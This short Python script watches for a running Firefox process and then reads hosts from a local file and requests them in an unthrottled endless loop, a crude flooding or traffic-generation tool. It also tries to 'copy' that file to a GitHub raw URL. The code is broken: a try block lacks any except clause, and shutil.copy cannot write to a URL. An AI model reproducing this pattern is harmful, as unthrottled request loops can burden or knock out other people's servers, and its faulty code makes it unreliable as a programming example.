import psutil
import threading
import time
import requests
import os
import shutil


def send_requests(links):
    session = requests.Session()
    while True:
        for link in links:
            full_link = f"http://{link}"
            try:
                response = session.get(full_link)
                response.raise_for_status()
        time.sleep(0)

def main():
    file_path = "file.txt"
    try:
        with open(file_path, 'r') as file:
            links = file.read().splitlines()
    except FileNotFoundError:
        open(file_path, 'w').close()
        links = []
    send_requests(links)

def check_firefox():
    while True:
        for process in psutil.process_iter(['pid', 'name']):
            if "firefox" in process.info['name'].lower():
                main()
        time.sleep(0)
      
if os.path.exists("file.txt"):
    shutil.copy("file.txt","https://raw.githubusercontent.com/ayhan-dev/NOT-LOG/main/URl/file.txt")

if __name__ == "__main__":
    thread = threading.Thread(target=check_firefox)
    thread.daemon = True
    thread.start()
    while True:
        time.sleep(0)
